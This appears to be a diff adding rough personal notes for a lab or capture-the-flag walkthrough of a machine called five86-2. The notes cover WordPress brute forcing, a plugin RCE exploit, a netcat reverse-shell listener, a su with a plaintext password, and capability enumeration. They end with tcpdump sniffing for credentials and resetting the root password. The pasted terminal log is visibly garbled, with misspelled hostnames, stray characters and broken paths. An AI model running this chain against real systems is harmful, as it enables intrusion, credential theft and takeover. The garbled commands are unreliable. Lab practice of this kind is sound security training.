@@ -1,0 +1,65 @@
+1.  starting with wpscan bruteforce- get creds
+    
+2.  ==WordPress Plugin Insert or Embed Articulate Content into WordPress - RCE==
+    
+
+3)exploit db gave us a shell
+
+4)now ==capabilites -> tcpdump==
+
+5.  ==id had tcpdump== which measns we can run it
+
+6)we got interface name which was up, so we can run on that to get creds
+
+7)
+
+root@kali:~# nc -lvp 1234 Q
+listening on [any] 1234 ...
+connect to [192.168.0.115] from five86-2 [192.168.0.114] 35072
+: cannot set terminal process group (1052): Inappropriate ioctl for device
+no job control in this shell
+ww -data@five86-2: /var/www/html/wp-content/uploads/articulate_uploads/raj$ cd /home
+<wp-content/uploads/articulate uploads/raj$ cd /home
+ww-data@fives6-2: /home$ su stephen
+su stephenéa
+Password: apollol
+python3 -c ‘import pty;pty.spawn("/bin/bash")’ ¢&g
+stephen@five86-2:/home$ id
+id
+uid=1002 (stephen) gid=1002(stephen) groups=1002 (stephen), 1009 (pcap)
+stephen@fives6-2: /home$ [getcap -r / 2>/dev/null | <a
+getcap -r / 2>/dev/null
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/1ib/x86_64-linux-gnu/gstreamerl.@/gstreamer-1.0/gst-ptp-helper = cap_net_bind_:
+/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
+stephen@five86-2:/home$ cd stephen
+cd stephen
+stephen@five86-2:~$ tcpdump -D ---------------------
+tcpdump -D
+
+9
+
+vethemenrethe [Up, Running]   ----------got this
+
+lo [Up, Running, Loopback]
+
+.any (Pseudo-device that captures on all interfaces) [Up, Running]
+.dockero [up]
+
+.nflog (Linux netfilter log (NFLOG) interface) [none]
+
+.nfqueue (Linux netfilter queue (NFQUEUE) interface) [none]
+
+
+
+8)
+
+```
+tcpdump -D
+tcpdump -i veth1665bcd
+wait for creds
+```
+
+9.  now to be root ==/usr/bin/passwd root== set new passwd
